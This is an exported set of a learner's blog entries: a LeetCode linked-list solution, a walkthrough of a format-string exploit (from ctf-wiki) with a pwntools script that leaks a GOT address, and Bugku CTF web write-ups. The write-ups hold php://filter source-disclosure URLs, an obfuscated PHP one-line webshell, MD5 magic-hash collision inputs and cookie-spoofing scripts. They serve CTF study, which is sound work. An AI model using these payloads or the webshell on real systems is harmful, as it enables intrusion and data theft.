正解看了眼答案，才明白自己从开始就想错了 1234567891011121314151617181920212223242526272829303132333435363738public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; ListNode dummyHead = new ListNode(0); ListNode p = l1, q = l2, curr = dummyHead; int carry = 0; while (p != null || q != null) &#123; int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10); curr = curr.next; if (p != null) p = p.next; if (q != null) q = q.next; &#125; if (carry &gt; 0) &#123; curr.next = new ListNode(carry); &#125; return dummyHead.next;&#125; 最关键的就是 ==int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10);== 其实只需要从低位开始一位位的加上去就好了。 然后再把它们给链起来]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[格式化字符串分析]]></title>
    <url>%2F2019%2F05%2F04%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[格式化字符串这个题目是ctfwiki上的 c代码如下： 123456789#include &lt;stdio.h&gt;int main() &#123; char s[100]; int a = 1, b = 0x22222222, c = -1; scanf("%s", s); printf("%08x.%08x.%08x.%s\n", a, b, c, s); printf(s); return 0;&#125; （突然发现腾讯文档居然还支持代码好强啊 我们编译一下： 1gcc -m32 -fno-stack-protector -no-pie -o leakMemory leakMemory.c -g 把保护措施都关掉了 1234567 % checksec leakMemory [*] '/home/abc/Desktop/pwn/leakMemory/leakMemory' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 先看一下几个payload 12345678pwndbg&gt; b printfBreakpoint 1 at 0x8048330pwndbg&gt; rStarting program: /home/abc/Desktop/pwn/leakMemory/leakMemory %08x.%08x.%08xBreakpoint 1, __printf (format=0x8048593 "%08x.%08x.%08x.%s\n") at printf.c:2828printf.c: No such file or directory. 在printf处下断点此时栈上的布局如下 12345600:0000│ esp 0xffffcf9c —▸ 0x80484ea (main+100) ◂— add esp, 0x2001:0004│ 0xffffcfa0 —▸ 0x8048593 ◂— and eax, 0x2e783830 /* '%08x.%08x.%08x.%s\n' */02:0008│ 0xffffcfa4 ◂— 0x103:000c│ 0xffffcfa8 ◂— 0x22222222 ('""""')04:0010│ 0xffffcfac ◂— 0xffffffff05:0014│ 0xffffcfb0 —▸ 0xffffcfc0 ◂— '%08x.%08x.%08x' continue一下： 123456pwndbg&gt; cContinuing.00000001.22222222.ffffffff.%08x.%08x.%08xBreakpoint 1, __printf (format=0xffffcfc0 "%08x.%08x.%08x") at printf.c:2828in printf.c 输出了信息的同时， 命中第二个断点 此时栈上的布局如下： 1234567800:0000│ esp 0xffffcfac —▸ 0x80484f9 (main+115) ◂— add esp, 0x1001:0004│ 0xffffcfb0 —▸ 0xffffcfc0 ◂— '%08x.%08x.%08x'... ↓03:000c│ 0xffffcfb8 —▸ 0xf7fcf410 —▸ 0x8048278 ◂— inc edi /* 'GLIBC_2.0' */04:0010│ 0xffffcfbc —▸ 0x804849d (main+23) ◂— add ebx, 0x1b6305:0014│ eax 0xffffcfc0 ◂— '%08x.%08x.%08x'06:0018│ 0xffffcfc4 ◂— '.%08x.%08x'07:001c│ 0xffffcfc8 ◂— 'x.%08x' 此时printf函数会把格式化字符串之后的栈上的信息当作参数打印出来：contiue一下 123pwndbg&gt; cContinuing.ffffcfc0.f7fcf410.0804849d[Inferior 1 (process 4975) exited normally] 之前栈上的信息显示的不全，栈的内存如下： 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d0xffffcfc0:0x78383025 0x3830252e 0x30252e78 0x000078380xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0x6f984f000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 0xffffcfb0 是格式化字符串的地址， 我们看到此时printf函数将0xffffcfc0 0xf7fcf410 0x0804849d都打印出来了， 也就是格式化字符串之后的三个位置的信息 我们通过这种方式泄露栈的信息，但是也可以直接去取得栈中被视为第n+1个参数的值至于为什么是第n+1, 这是因为格式化字符串是第一个参数 比如 通过 %3\$x(这个的原理是啥？为什么要加\$符号) 我们可以泄露栈上被视为第4个参数的值 栈布局如下：(左边的一列是栈地址，也就是内存的地址，箭头代表了这个内存单元存储的数据，如果是指针还会进一步指示) 1234567800:0000│ esp 0xffffcfac —▸ 0x80484f9 (main+115) ◂— add esp, 0x1001:0004│ 0xffffcfb0 —▸ 0xffffcfc0 ◂— '%3$x'... ↓(这里是省略号，是不是就是直接指向了，中间那个就被跳过了)03:000c│ 0xffffcfb8 —▸ 0xf7fcf410 —▸ 0x8048278 ◂— inc edi /* 'GLIBC_2.0' */04:0010│ 0xffffcfbc —▸ 0x804849d (main+23) ◂— add ebx, 0x1b6305:0014│ eax 0xffffcfc0 ◂— '%3$x'06:0018│ 0xffffcfc4 ◂— 0x007:001c│ 0xffffcfc8 —▸ 0xf7ffd940 ◂— 0x0 同样看不清， 还是直接打印内存信息吧(x命令的用法，这里显示的是内存地址从0xffffcfb0开始的，因为内存是按照字节编址的，所以一行正好是16个字节内存地址就是加10) 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d (0xffffcfb0这个内存单元指向了0xffffcfc0)0xffffcfc0:0x78243325 0x00000000 0xf7ffd940 0x000000c2 (看内存单元0xffffcfc0存放的内容就是x$3%)0xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0xd6a577000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 猜猜这时候打印的信息是啥？答案是栈上被视为第四个参数的信息： 0x0804849d 同样的我们还可以通过%s来得到字符串的信息 栈布局如下： 1234567800:0000│ esp 0xffffcfac —▸ 0x80484f9 (main+115) ◂— add esp, 0x1001:0004│ 0xffffcfb0 —▸ 0xffffcfc0 ◂— 0x7325 /* '%s' */... ↓03:000c│ 0xffffcfb8 —▸ 0xf7fcf410 —▸ 0x8048278 ◂— inc edi /* 'GLIBC_2.0' */04:0010│ 0xffffcfbc —▸ 0x804849d (main+23) ◂— add ebx, 0x1b6305:0014│ eax 0xffffcfc0 ◂— 0x7325 /* '%s' */06:0018│ 0xffffcfc4 ◂— 0x107:001c│ 0xffffcfc8 —▸ 0xf7ffd940 ◂— 0x0 还是看不清，直接看内存吧(md 垃圾pwndbg) 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d0xffffcfc0:0x00007325 0x00000001 0xf7ffd940 0x000000c20xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0xf1ae29000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 这个时候会直接将 0xffffcfc0 对应的字符串打印出来结果自然就是 %s了 如果我们输入%2$s, 这个时候就很有趣了， 按照道理程序会将 0xf7fcf410 对应地址的当作字符串打印出来， 可是如果这个地址无效呢？我自己尝试的结果是直接退出了，什么都没有打印出来emm 这时候如果我们指定一个合法的地址， 比如got表中某个函数的地址这就很神奇了 exp如下： 123456789101112131415161718192021222324252627from pwn import *import timesh = process('./leakMemory')context.log_level = 'debug'leakmemory = ELF('./leakMemory')__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']print hex(__isoc99_scanf_got)payload = p32(__isoc99_scanf_got) + '%4$s'print payloadpayload1 = '%4$s' #这两个payload是自己测试的payload2 = 'AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'gdb.attach(sh)#time.sleep(1)sh.sendline(payload)sh.recvuntil('%4$s\n')#print sh.recvuntil('%4$s\n')#print '\n'print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@gotsh.interactive() 我们运行这个exp在pwndbg中下断点 运行到第二个printf的时候 123456789───────────────────────────────────[ STACK ]────────────────────────────────────00:0000│ esp 0xffa3bdfc —▸ 0x80484f9 (main+115) ◂— add esp, 0x1001:0004│ 0xffa3be00 —▸ 0xffa3be10 —▸ 0x804a014 (_GLOBAL_OFFSET_TABLE_+20) —▸ 0xf7df2bb0 (__isoc99_scanf) ◂— push ebp... ↓03:000c│ 0xffa3be08 —▸ 0xf7f85410 —▸ 0x8048278 ◂— inc edi /* 'GLIBC_2.0' */04:0010│ 0xffa3be0c —▸ 0x804849d (main+23) ◂— add ebx, 0x1b6305:0014│ eax 0xffa3be10 —▸ 0x804a014 (_GLOBAL_OFFSET_TABLE_+20) —▸ 0xf7df2bb0 (__isoc99_scanf) ◂— push ebp06:0018│ 0xffa3be14 ◂— '%4$s'07:001c│ 0xffa3be18 —▸ 0xf7fb3900 (catch_hook) ◂— 0x0 另一边 123456789[+] Waiting for debugger: Done[DEBUG] Sent 0x9 bytes: 00000000 14 a0 04 08 25 34 24 73 0a │····│%4$s│·│ 00000009[DEBUG] Received 0x24 bytes: 00000000 30 30 30 30 30 30 30 31 2e 32 32 32 32 32 32 32 │0000│0001│.222│2222│ 00000010 32 2e 66 66 66 66 66 66 66 66 2e 14 a0 04 08 25 │2.ff│ffff│ff.·│···%│ 00000020 34 24 73 0a │4$s·││ 00000024 continue 1234567[DEBUG] Received 0x8 bytes: 00000000 14 a0 04 08 b0 2b df f7 │····│·+··││ 000000080xf7df2bb0[*] Switching to interactive mode[*] Process './leakMemory' stopped with exit code 0 (pid 5064)[*] Got EOF while reading in interactive 这个时候我们就得到了scanf函数的地址了ok 还有几个地方没弄明白之后再写 确定可控制格式化字符串位置的方法既然程序是有漏洞的，我们就必须知道可被控制的格式化字符串的位置，这时候大致有以下几种姿势 构造类似 [tag]%p%p%p%p%p%p...这样的参数 Pwngdb中有一个叫做fmarg可以用来获取指定地址到底是第几个参数 不是很理解第一种方法原理，但是第二种方法比较好用 不过我们可以来看一个例子： IDA中的C代码： 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+3h] [rbp-3Dh] signed int i; // [rsp+4h] [rbp-3Ch] signed int j; // [rsp+4h] [rbp-3Ch] char *format; // [rsp+8h] [rbp-38h] _IO_FILE *fp; // [rsp+10h] [rbp-30h] char *v9; // [rsp+18h] [rbp-28h] char v10[24]; // [rsp+20h] [rbp-20h] unsigned __int64 v11; // [rsp+38h] [rbp-8h] v11 = __readfsqword(0x28u); fp = fopen("flag.txt", "r"); for ( i = 0; i &lt;= 21; ++i ) v10[i] = _IO_getc(fp); fclose(fp); v9 = v10; puts("what's the flag"); fflush(_bss_start); format = 0LL; __isoc99_scanf("%ms", &amp;format); for ( j = 0; j &lt;= 21; ++j ) &#123; v4 = format[j]; if ( !v4 || v10[j] != v4 ) &#123; puts("You answered:"); printf(format); puts("\nBut that was totally wrong lol get rekt"); fflush(_bss_start); return 0; &#125; &#125; printf("That's right, the flag is %s\n", v9); fflush(_bss_start); return 0;&#125; 显然的格式化字符串漏洞 我们需要在printf函数处下断点 然后随便输入一些数字: 123456789101112131415161718192021222324[-------------------------------------code-------------------------------------] 0x7ffff7a48e6c &lt;__fprintf+172&gt;: call 0x7ffff7b18c80 &lt;__stack_chk_fail&gt; 0x7ffff7a48e71: nop WORD PTR cs:[rax+rax*1+0x0] 0x7ffff7a48e7b: nop DWORD PTR [rax+rax*1+0x0]=&gt; 0x7ffff7a48e80 &lt;__printf&gt;: sub rsp,0xd8 0x7ffff7a48e87 &lt;__printf+7&gt;: test al,al 0x7ffff7a48e89 &lt;__printf+9&gt;: mov QWORD PTR [rsp+0x28],rsi 0x7ffff7a48e8e &lt;__printf+14&gt;: mov QWORD PTR [rsp+0x30],rdx 0x7ffff7a48e93 &lt;__printf+19&gt;: mov QWORD PTR [rsp+0x38],rcx[------------------------------------stack-------------------------------------]0000| 0x7fffffffde08 --&gt; 0x400890 (&lt;main+234&gt;: mov edi,0x4009b8)0008| 0x7fffffffde10 --&gt; 0x61000001 0016| 0x7fffffffde18 --&gt; 0x602cb0 ('a' &lt;repeats 16 times&gt;)0024| 0x7fffffffde20 --&gt; 0x602260 --&gt; 0x0 0032| 0x7fffffffde28 --&gt; 0x7fffffffde30 ("flag&#123;", '1' &lt;repeats 12 times&gt;, "&#125;\n\377\377\377")0040| 0x7fffffffde30 ("flag&#123;", '1' &lt;repeats 12 times&gt;, "&#125;\n\377\377\377")0048| 0x7fffffffde38 ("111111111&#125;\n\377\377\377")0056| 0x7fffffffde40 --&gt; 0xffffff0a7d31 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, __printf (format=0x602cb0 'a' &lt;repeats 16 times&gt;) at printf.c:2828 printf.c: No such file or directory. 这时候可以看到flag了，注意我们是在本地调试，调试的时候当然可以看到flag，一般的pwn题都是要远程连接的 如果我们要泄露flag的值，就需要构造%n$s这样的传进去。所以获取参数的位置很关键 12gdb-peda$ fmtarg 0x7fffffffde28The index of format argument : 10 ("\%9$p") 通过Pwngdb就可以查看参数的位置了 这时候运行 12345678abc@ubuntu ~/Desktop/pwnEaxmple/zifuchuan % ./goodluck what's the flag%9$sYou answered:flag&#123;111111111111&#125;���But that was totally wrong lol get rekt 就得到了flag (这里值得注意的就是，64位系统和32位系统传参是不一样的)]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku web题目的wp]]></title>
    <url>%2F2019%2F02%2F07%2Fbugku-web%E9%A2%98%E7%9B%AE%E7%9A%84wp%2F</url>
    <content type="text"><![CDATA[welcome to bugkuctf ctrl + U查看页面源代码， 如果有 $user且 file_get_contents($user, &#39;r&#39;) 的 值是 指定的字符串。 就会 include $file 的内容 。 并且提示是 hint.php这个文件 这里涉及到一个怎么把 get 方法传入的参数作为一个文件打开。 php伪协议这里用到了 php://input 但是。。 这就要用到第二个伪协议：php://filter 我那样传递参数会报错， include($file) 只是把 $file 这个变量当作文件名包括进去了。 就是含在源代码里， 不是简单地构造一个参数就能达到的。 这就是一个泄露了源码的漏洞了。 最后构造的URL如下：http://123.206.87.240:8006/test1/?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php 惊叹。base64 解密之后的源代码。 12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; 代码里面构造了一个类。公有变量是 $file 继续看一下 index.php 的源代码 123456789101112131415161718192021222324252627282930313233&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "ä¸è½ç°å¨å°±ç»ä½ flagå¦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 有几个地方暂时写不到位， 先到这里好了。 过狗一句话很蒙 1234&lt;?php $poc="a#s#s#e#r#t";$poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; 上面是题目提示的过狗一句话代码。然后…后面的不会了 字符，正则？ 前女友一道很有趣的题目， 就不说题目了， 直接放我的测试代码 123456789101112131415161718192021&lt;?phperror_reporting(0);if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; echo "$v1&lt;/br&gt;"; var_dump($v1); echo "&lt;/br&gt;"; echo md5($v1)."&lt;/br&gt;"; echo "$v2&lt;/br&gt;"; echo md5($v2)."&lt;/br&gt;"; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; echo "true"; &#125; else &#123; echo "false"; &#125;&#125;?&gt; 也是第一次发现get还能传递数组（不过当然是一堆的错误） MD5 collision还不太清楚MD5 碰撞是啥， 以后补坑 payload120.24.86.145:9009/md5.php?a=s878926199a 常用的MD5碰撞123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e5093672134182067008420087635140e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 秋名山老司机123456789101112&lt;head&gt;&lt;title&gt;下面的表达式的值是秋名山的车速&lt;/title&gt;&lt;meta charset="UTF-8"&gt;&lt;/head&gt;&lt;p&gt;亲请在2s内计算老司机的车速是多少&lt;/p&gt;&lt;div&gt;1782911879+706686703-1996813020-984998196*1213520247-1805071043*379299795+1623596400-1052850963+2102818407-2101949215=?;&lt;/div&gt;&lt;style&gt;div,p&#123;text-align: center;margin: 0 auto;&#125;&lt;/style&gt; 两秒之内计算出式子中的值， 再提交 菜鸡还不太会写脚本参考了dalao们的代码 123456789import requestsimport reurl = 'http://120.24.86.145:8002/qiumingshan/'s = requests.Session()source = s.get(url)expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group()result = eval(expression)post = &#123;'value': result&#125;print(s.post(url, data = post).text) 不过还是没搞出来。 复习一下requests库 1234567import requests#构造requests对象s = requests.get(url)s.post(url, )#差不多就这些了 cookies欺骗 然而注意到URL中的line和file时就能做出来了。 1234567#用脚本把代码跑出来import requestsa=30for i in range(a): url="http://120.24.86.145:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" s=requests.get(url) print s.text 1234567891011121314151617181920&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; //看这里 $file_list[2]='keys.php'; &#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 构造cookie就行啦（然而没搞出flag来） login4CBC字节翻转攻击放一张经典的图 据师傅们的wp说是有一个index.php.swp文件存在。然而没找到， 先把师傅们找到的源码放上来 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;?phpdefine("SECRET_KEY", file_get_contents('/root/key'));define("METHOD", "aes-128-cbc");session_start();function get_random_iv()&#123; $random_iv=''; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie("iv", base64_encode($iv)); setcookie("cipher", base64_encode($cipher));&#125;function check_login()&#123; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE["iv"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die("&lt;p&gt;base64_decode('".base64_encode($plain)."') can't unserialize&lt;/p&gt;"); $_SESSION['username'] = $info['username']; &#125;else&#123; die("ERROR!"); &#125; &#125;&#125;function show_homepage()&#123; if ($_SESSION["username"]==='admin')&#123; echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; &#125;else&#123; echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; &#125; echo '&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;';&#125;if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; if($username === 'admin')&#123; exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); &#125;else&#123; info = array('username'=&gt;username,'password'=&gt;password); login(info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION["username"]))&#123; check_login(); show_homepage(); &#125;else&#123; echo '&lt;body class="login-body"&gt; &lt;div id="wrapper"&gt; &lt;div class="user-icon"&gt;&lt;/div&gt; &lt;div class="pass-icon"&gt;&lt;/div&gt; &lt;form name="login-form" class="login-form" action="" method="post"&gt; &lt;div class="header"&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class="content"&gt; &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt; &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt; &lt;/div&gt; &lt;div class="footer"&gt; &lt;input type="submit" name="submit" value="Login" class="button" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; &#125;&#125;?&gt;&lt;/html&gt; 备份是个好习惯根据以前做题的经验， 备份就是在提示你 存在bak文件所以直接输入URL为 http://123.206.87.240:8002/web16/index.php.bak 然后下载文件代码： 1234567891011121314&lt;?phpinclude_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125;?&gt; 做代码审计的题目， 还是主要靠自己尝试。 1234567891011121314151617181920212223242526&lt;?phperror_reporting(0);$str = strstr($_SERVER['REQUEST_URI'], '?');echo "$str"."&lt;/br&gt;";$str = substr($str, 1);echo "$str"."&lt;/br&gt;";$str = str_replace('key','', $str);echo "$str"."&lt;/br&gt;";parse_str($str);echo "$key1"."&lt;/br&gt;";echo md5($key1);echo "&lt;/br&gt;";echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2) echo 'flag';?&gt; 上面是我用来测试的代码 构造URL为 http://localhost/test/test.php?kkeyey1=1&amp;kkeyey2=2输出了这些：123456?kkeyey1=1&amp;kkeyey2=2kkeyey1=1&amp;kkeyey2=2key1=1&amp;key2=21c4ca4238a0b923820dcc509a6f75849bc81e728d9d4c2f636f067f89cc14862c 之前还很疑惑为什么没有get都能得到变量， 原来是parse_str这个函数在起作用。 OK， 现在就是表演的时间了。 参考资料https://blog.csdn.net/wy_97/article/details/77431111https://www.cnblogs.com/Pinging/p/8278168.htmlhttps://blog.csdn.net/qq_19861715/article/details/79384018 https://blog.csdn.net/qq_39629343/article/details/80696263 秋名山老司机cookie欺骗CBC字节翻转攻击 python requests库学习]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
</search>
